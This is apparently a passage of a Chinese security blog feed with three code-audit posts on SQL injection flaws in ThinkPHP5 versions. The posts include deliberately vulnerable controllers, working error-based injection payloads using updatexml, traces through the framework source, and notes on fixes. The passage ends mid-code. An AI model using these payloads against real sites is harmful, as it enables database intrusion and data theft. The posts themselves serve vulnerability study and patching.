    <link href="http://example.com/2024/06/04/ThinkPHP5%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SQL%E6%B3%A8%E5%85%A5-%E4%B8%89/"/>
    <id>http://example.com/2024/06/04/ThinkPHP5%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SQL%E6%B3%A8%E5%85%A5-%E4%B8%89/</id>
    <published>2024-06-04T13:48:36.000Z</published>
    <updated>2024-08-22T10:14:10.865Z</updated>
    
    <content type="html"><![CDATA[<h1 id="漏洞环境"><a href="#漏洞环境" class="headerlink" title="漏洞环境"></a>漏洞环境</h1><p>漏洞影响版本：5.1.16&lt;&#x3D;ThinkPHP5&lt;&#x3D;5.1.22</p><p>application&#x2F;index&#x2F;controller&#x2F;Index.php</p><pre><code class="php">&lt;?phpnamespace app\index\controller;class Index&#123;    public function index()    &#123;        $orderby = request()-&gt;get(&#39;orderby&#39;);        $result = db(&#39;users&#39;)-&gt;where([&#39;username&#39; =&gt; &#39;p0l1st&#39;])-&gt;order($orderby)-&gt;find();        var_dump($result);    &#125;&#125;</code></pre><p>payload</p><pre><code>orderby[id`|updatexml(1,concat(0x7,user(),0x7e),1)%23]=1 </code></pre><h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>根据上面的payload，首先跟进Request类的get方法，发现其又调用了input方法</p><p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221813106.png" alt="image-20240604222722432"></p><p>跟进input方法，虽然使用了filterValue方法对数据进行了简单过滤，但是没有对数组的键进行过滤</p><p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221813704.png" alt="image-20240604223338259"></p><p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221813500.png" alt="image-20240604223708927"></p><p>然后数据被传入order方法中，我们再跟进order方法，发现数据是直接存储在options[‘order’]中</p><p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221813456.png" alt="image-20240604223922483"></p><p>继续跟进find方法，Connection类中的find方法调用了Builder类中的select方法生成SQL语句</p><p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221813357.png" alt="image-20240604225052547"></p><p>而select方法又调用了parseOrder方法</p><p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221813608.png" alt="image-20240604225353763"></p><p>继续跟进parseOrder方法，发现对$key使用了parseKey方法，然后拼接字符串返回</p><p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221814755.png" alt="image-20240604230005053"></p><p>跟进Mysql中的parseKey方法，发现给变量前后加上了反引号，但是没有进行任何过滤</p><p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221814158.png" alt="image-20240604230217376"></p><h1 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h1><p>拼接字符串前对变量进行检查，看是否存在) 和# 符号</p><h1 id="链子"><a href="#链子" class="headerlink" title="链子"></a>链子</h1><p><img src="https://github.com/Mochazz/ThinkPHP-Vuln/raw/master/ThinkPHP5/ThinkPHP5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8BSQL%E6%B3%A8%E5%85%A55/8.png" alt="8"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;漏洞环境&quot;&gt;&lt;a href=&quot;#漏洞环境&quot; class=&quot;headerlink&quot; title=&quot;漏洞环境&quot;&gt;&lt;/a&gt;漏洞环境&lt;/h1&gt;&lt;p&gt;漏洞影响版本：5.1.16&amp;lt;&amp;#x3D;ThinkPHP5&amp;lt;&amp;#x3D;5.1.22&lt;/p&gt;
&lt;p&gt;applic</summary>
      
    
    
    
    
    <category term="代码审计" scheme="http://example.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>ThinkPHP5代码审计:SQL注入(二)</title>
    <link href="http://example.com/2024/06/03/ThinkPHP5%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SQL%E6%B3%A8%E5%85%A5-%E4%BA%8C/"/>
    <id>http://example.com/2024/06/03/ThinkPHP5%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SQL%E6%B3%A8%E5%85%A5-%E4%BA%8C/</id>
    <published>2024-06-03T13:29:08.000Z</published>
    <updated>2024-08-22T10:13:21.252Z</updated>
    
    <content type="html"><![CDATA[<p>影响版本:5.0.13&lt;&#x3D;ThinkPHP&lt;&#x3D;5.0.15  5.1.0&lt;&#x3D;ThinkPHP&lt;&#x3D;5.1.5</p><h1 id="漏洞环境"><a href="#漏洞环境" class="headerlink" title="漏洞环境"></a>漏洞环境</h1><p>首先配置application&#x2F;index&#x2F;controller&#x2F;Index.php</p><pre><code class="php">&lt;?phpnamespace app\index\controller;class Index&#123;    public function index()    &#123;        $username = request()-&gt;get(&#39;username/a&#39;);        db(&#39;users&#39;)-&gt;insert([&#39;username&#39; =&gt; $username]);        return &#39;Update success&#39;;    &#125;&#125;</code></pre><p>payload:</p><pre><code>username[0]=inc&amp;username[1]=updatexml(1,concat(0x7,user(),0x7e),1)&amp;username[2]=1 </code></pre><p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221812398.png" alt="image-20240603212607333"></p><h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>根据上面的payload，首先跟进insert方法</p><p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221812602.png" alt="image-20240603213522234"></p><p>这里的$this-&gt;builder为think&#x2F;db&#x2F;builder&#x2F;Mysql类，而Mysql类继承于Builder类，所以$this-&gt;builder-&gt;insert()最终调用的是Builder类的insert方法</p><p>而Builder类的insert方法调用了parseData方法来分析处理数据</p><p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221812679.png" alt="image-20240603214338812"></p><p>在parseData方法中：</p><p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221812664.png" alt="image-20240603214450133"></p><p>可以看到parseData方法直接将来自用户的数据$val进行了拼接返回，虽然经过了parseKey方法，但是这个方法并没有对数据进行过滤</p><p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221812017.png" alt="image-20240603214749643"></p><p>那么再回到Builder类的insert方法，我们可以通过填充字符串的方式将$data填充到SQL语句中，造成SQL注入漏洞</p><p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221812968.png" alt="image-20240603215501911"></p><h1 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h1><p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221812464.png" alt="image-20240604231926868"></p><h1 id="链子"><a href="#链子" class="headerlink" title="链子"></a>链子</h1><p><img src="https://github.com/Mochazz/ThinkPHP-Vuln/raw/master/ThinkPHP5/ThinkPHP5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8BSQL%E6%B3%A8%E5%85%A51/9.png" alt="9"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;影响版本:5.0.13&amp;lt;&amp;#x3D;ThinkPHP&amp;lt;&amp;#x3D;5.0.15  5.1.0&amp;lt;&amp;#x3D;ThinkPHP&amp;lt;&amp;#x3D;5.1.5&lt;/p&gt;
&lt;h1 id=&quot;漏洞环境&quot;&gt;&lt;a href=&quot;#漏洞环境&quot; class=&quot;headerlink</summary>
      
    
    
    
    
    <category term="代码审计" scheme="http://example.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>ThinkPHP5代码审计:SQL注入(一)</title>
    <link href="http://example.com/2024/06/01/ThinkPHP5%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SQL%E6%B3%A8%E5%85%A5-%E4%B8%80/"/>
    <id>http://example.com/2024/06/01/ThinkPHP5%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SQL%E6%B3%A8%E5%85%A5-%E4%B8%80/</id>
    <published>2024-06-01T08:47:17.000Z</published>
    <updated>2024-06-01T08:49:13.997Z</updated>
    
    <content type="html"><![CDATA[<p>漏洞影响版本:ThinkPHP5全版本</p><p>Index.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">app</span>\<span class="title class_">index</span>\<span class="title class_">controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$username</span> = <span class="title function_ invoke__">request</span>()-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;username&#x27;</span>);</span><br><span class="line">        <span class="variable">$result</span> = <span class="title function_ invoke__">db</span>(<span class="string">&#x27;users&#x27;</span>)-&gt;<span class="title function_ invoke__">where</span>(<span class="string">&#x27;username&#x27;</span>,<span class="string">&#x27;exp&#x27;</span>,<span class="variable">$username</span>)-&gt;<span class="title function_ invoke__">select</span>();</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;select success&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>调用Request类的get方法时也会调用该类的input方法，但是该方法没有对数据进行过滤</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get</span>(<span class="params"><span class="variable">$name</span> = <span class="string">&#x27;&#x27;</span>, <span class="variable">$default</span> = <span class="literal">null</span>, <span class="variable">$filter</span> = <span class="string">&#x27;&#x27;</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable language_">$this</span>-&gt;get)) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;get = <span class="variable">$_GET</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">input</span>(<span class="variable">$this</span>-&gt;get, <span class="variable">$name</span>, <span class="variable">$default</span>, <span class="variable">$filter</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">input</span>(<span class="params"><span class="variable">$data</span> = [], <span class="variable">$name</span> = <span class="string">&#x27;&#x27;</span>, <span class="variable">$default</span> = <span class="literal">null</span>, <span class="variable">$filter</span> = <span class="string">&#x27;&#x27;</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="literal">false</span> === <span class="variable">$name</span>) &#123;</span><br><span class="line">            <span class="comment">// 获取原始数据</span></span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$data</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$name</span> = (<span class="keyword">string</span>) <span class="variable">$name</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="string">&#x27;&#x27;</span> != <span class="variable">$name</span>) &#123;</span><br><span class="line">            <span class="comment">// 解析name</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$name</span>, <span class="string">&#x27;/&#x27;</span>)) &#123;</span><br><span class="line">                <span class="keyword">list</span>(<span class="variable">$name</span>, <span class="variable">$type</span>) = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;/&#x27;</span>, <span class="variable">$name</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$data</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getData</span>(<span class="variable">$data</span>, <span class="variable">$name</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">is_null</span>(<span class="variable">$data</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="variable">$default</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">is_object</span>(<span class="variable">$data</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="variable">$data</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 解析过滤器</span></span><br><span class="line">        <span class="variable">$filter</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getFilter</span>(<span class="variable">$filter</span>, <span class="variable">$default</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">is_array</span>(<span class="variable">$data</span>)) &#123;</span><br><span class="line">            <span class="title function_ invoke__">array_walk_recursive</span>(<span class="variable">$data</span>, [<span class="variable">$this</span>, <span class="string">&#x27;filterValue&#x27;</span>], <span class="variable">$filter</span>);</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">version_compare</span>(PHP_VERSION, <span class="string">&#x27;7.1.0&#x27;</span>, <span class="string">&#x27;&lt;&#x27;</span>)) &#123;</span><br><span class="line">                <span class="comment">// 恢复PHP版本低于 7.1 时 array_walk_recursive 中消耗的内部指针</span></span><br><span class="line">                <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">arrayReset</span>(<span class="variable">$data</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">filterValue</span>(<span class="variable">$data</span>, <span class="variable">$name</span>, <span class="variable">$filter</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$type</span>) &amp;&amp; <span class="variable">$data</span> !== <span class="variable">$default</span>) &#123;</span><br><span class="line">            <span class="comment">// 强制类型转换</span></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">typeCast</span>(<span class="variable">$data</span>, <span class="variable">$type</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$data</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>查询时先调用Query类的where方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">where</span>(<span class="params"><span class="variable">$field</span>, <span class="variable">$op</span> = <span class="literal">null</span>, <span class="variable">$condition</span> = <span class="literal">null</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$param</span> = <span class="title function_ invoke__">func_get_args</span>();</span><br><span class="line">        <span class="title function_ invoke__">array_shift</span>(<span class="variable">$param</span>);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">parseWhereExp</span>(<span class="string">&#x27;AND&#x27;</span>, <span class="variable">$field</span>, <span class="variable">$op</span>, <span class="variable">$condition</span>, <span class="variable">$param</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>通过parseWhereExp分析表达式</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">parseWhereExp</span>(<span class="params"><span class="variable">$logic</span>, <span class="variable">$field</span>, <span class="variable">$op</span>, <span class="variable">$condition</span>, <span class="variable">$param</span> = []</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$logic</span> = <span class="title function_ invoke__">strtoupper</span>(<span class="variable">$logic</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$field</span> <span class="keyword">instanceof</span> \<span class="built_in">Closure</span>) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;options[<span class="string">&#x27;where&#x27;</span>][<span class="variable">$logic</span>][] = <span class="title function_ invoke__">is_string</span>(<span class="variable">$op</span>) ? [<span class="variable">$op</span>, <span class="variable">$field</span>] : <span class="variable">$field</span>;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">is_string</span>(<span class="variable">$field</span>) &amp;&amp; !<span class="keyword">empty</span>(<span class="variable language_">$this</span>-&gt;options[<span class="string">&#x27;via&#x27;</span>]) &amp;&amp; !<span class="title function_ invoke__">strpos</span>(<span class="variable">$field</span>, <span class="string">&#x27;.&#x27;</span>)) &#123;</span><br><span class="line">            <span class="variable">$field</span> = <span class="variable language_">$this</span>-&gt;options[<span class="string">&#x27;via&#x27;</span>] . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$field</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">is_string</span>(<span class="variable">$field</span>) &amp;&amp; <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[,=\&gt;\&lt;\&#x27;\&quot;\(\s]/&#x27;</span>, <span class="variable">$field</span>)) &#123;</span><br><span class="line">            <span class="variable">$where</span>[] = [<span class="string">&#x27;exp&#x27;</span>, <span class="variable">$field</span>];</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">is_array</span>(<span class="variable">$op</span>)) &#123;</span><br><span class="line">                <span class="comment">// 参数绑定</span></span><br><span class="line">                <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">bind</span>(<span class="variable">$op</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (<span class="title function_ invoke__">is_null</span>(<span class="variable">$op</span>) &amp;&amp; <span class="title function_ invoke__">is_null</span>(<span class="variable">$condition</span>)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">is_array</span>(<span class="variable">$field</span>)) &#123;</span><br><span class="line">                <span class="comment">// 数组批量查询</span></span><br><span class="line">                <span class="variable">$where</span> = <span class="variable">$field</span>;</span><br><span class="line">                <span class="keyword">foreach</span> (<span class="variable">$where</span> <span class="keyword">as</span> <span class="variable">$k</span> =&gt; <span class="variable">$val</span>) &#123;</span><br><span class="line">                    <span class="variable language_">$this</span>-&gt;options[<span class="string">&#x27;multi&#x27;</span>][<span class="variable">$logic</span>][<span class="variable">$k</span>][] = <span class="variable">$val</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">elseif</span> (<span class="variable">$field</span> &amp;&amp; <span class="title function_ invoke__">is_string</span>(<span class="variable">$field</span>)) &#123;</span><br><span class="line">                <span class="comment">// 字符串查询</span></span><br><span class="line">                <span class="variable">$where</span>[<span class="variable">$field</span>]                            = [<span class="string">&#x27;null&#x27;</span>, <span class="string">&#x27;&#x27;</span>];</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;options[<span class="string">&#x27;multi&#x27;</span>][<span class="variable">$logic</span>][<span class="variable">$field</span>][] = <span class="variable">$where</span>[<span class="variable">$field</span>];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (<span class="title function_ invoke__">is_array</span>(<span class="variable">$op</span>)) &#123;</span><br><span class="line">            <span class="variable">$where</span>[<span class="variable">$field</span>] = <span class="variable">$param</span>;</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (<span class="title function_ invoke__">in_array</span>(<span class="title function_ invoke__">strtolower</span>(<span class="variable">$op</span>), [<span class="string">&#x27;null&#x27;</span>, <span class="string">&#x27;notnull&#x27;</span>, <span class="string">&#x27;not null&#x27;</span>])) &#123;</span><br><span class="line">            <span class="comment">// null查询</span></span><br><span class="line">            <span class="variable">$where</span>[<span class="variable">$field</span>]                            = [<span class="variable">$op</span>, <span class="string">&#x27;&#x27;</span>];</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;options[<span class="string">&#x27;multi&#x27;</span>][<span class="variable">$logic</span>][<span class="variable">$field</span>][] = <span class="variable">$where</span>[<span class="variable">$field</span>];</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (<span class="title function_ invoke__">is_null</span>(<span class="variable">$condition</span>)) &#123;</span><br><span class="line">            <span class="comment">// 字段相等查询</span></span><br><span class="line">            <span class="variable">$where</span>[<span class="variable">$field</span>]                            = [<span class="string">&#x27;eq&#x27;</span>, <span class="variable">$op</span>];</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;options[<span class="string">&#x27;multi&#x27;</span>][<span class="variable">$logic</span>][<span class="variable">$field</span>][] = <span class="variable">$where</span>[<span class="variable">$field</span>];</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$where</span>[<span class="variable">$field</span>] = [<span class="variable">$op</span>, <span class="variable">$condition</span>, <span class="keyword">isset</span>(<span class="variable">$param</span>[<span class="number">2</span>]) ? <span class="variable">$param</span>[<span class="number">2</span>] : <span class="literal">null</span>];</span><br><span class="line">            <span class="keyword">if</span> (<span class="string">&#x27;exp&#x27;</span> == <span class="title function_ invoke__">strtolower</span>(<span class="variable">$op</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$param</span>[<span class="number">2</span>]) &amp;&amp; <span class="title function_ invoke__">is_array</span>(<span class="variable">$param</span>[<span class="number">2</span>])) &#123;</span><br><span class="line">                <span class="comment">// 参数绑定</span></span><br><span class="line">                <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">bind</span>(<span class="variable">$param</span>[<span class="number">2</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 记录一个字段多次查询条件</span></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;options[<span class="string">&#x27;multi&#x27;</span>][<span class="variable">$logic</span>][<span class="variable">$field</span>][] = <span class="variable">$where</span>[<span class="variable">$field</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$where</span>)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;options[<span class="string">&#x27;where&#x27;</span>][<span class="variable">$logic</span>])) &#123;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;options[<span class="string">&#x27;where&#x27;</span>][<span class="variable">$logic</span>] = [];</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">is_string</span>(<span class="variable">$field</span>) &amp;&amp; <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">checkMultiField</span>(<span class="variable">$field</span>, <span class="variable">$logic</span>)) &#123;</span><br><span class="line">                <span class="variable">$where</span>[<span class="variable">$field</span>] = <span class="variable language_">$this</span>-&gt;options[<span class="string">&#x27;multi&#x27;</span>][<span class="variable">$logic</span>][<span class="variable">$field</span>];</span><br><span class="line">            &#125; <span class="keyword">elseif</span> (<span class="title function_ invoke__">is_array</span>(<span class="variable">$field</span>)) &#123;</span><br><span class="line">                <span class="keyword">foreach</span> (<span class="variable">$field</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$val</span>) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">checkMultiField</span>(<span class="variable">$key</span>, <span class="variable">$logic</span>)) &#123;</span><br><span class="line">                        <span class="variable">$where</span>[<span class="variable">$key</span>] = <span class="variable language_">$this</span>-&gt;options[<span class="string">&#x27;multi&#x27;</span>][<span class="variable">$logic</span>][<span class="variable">$key</span>];</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;options[<span class="string">&#x27;where&#x27;</span>][<span class="variable">$logic</span>] = <span class="title function_ invoke__">array_merge</span>(<span class="variable">$this</span>-&gt;options[<span class="string">&#x27;where&#x27;</span>][<span class="variable">$logic</span>], <span class="variable">$where</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>返回并继续调用select方法构建select语句</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">select</span>(<span class="params"><span class="variable">$data</span> = <span class="literal">null</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$options</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">parseExpress</span>();</span><br><span class="line">    <span class="variable">$resultSet</span> = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">false</span> === <span class="variable">$resultSet</span>) &#123;</span><br><span class="line">            <span class="comment">// 生成查询SQL</span></span><br><span class="line">            <span class="variable">$sql</span> = <span class="variable language_">$this</span>-&gt;builder-&gt;<span class="title function_ invoke__">select</span>(<span class="variable">$options</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>$this-&gt;builder为\think\db\builder\Mysql类，该类继承Builder类，接着会调用Builder类的select方法</p><p>在select方法中，程序会对SQL语句模板用变量填充，用来填充**%WHERE%**变量中存在用户输入的数据</p><p>&#x2F;thinkphp&#x2F;library&#x2F;think&#x2F;db&#x2F;Builder.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Builder</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">select</span>(<span class="params"><span class="variable">$options</span> = []</span>)</span></span><br><span class="line"><span class="function">    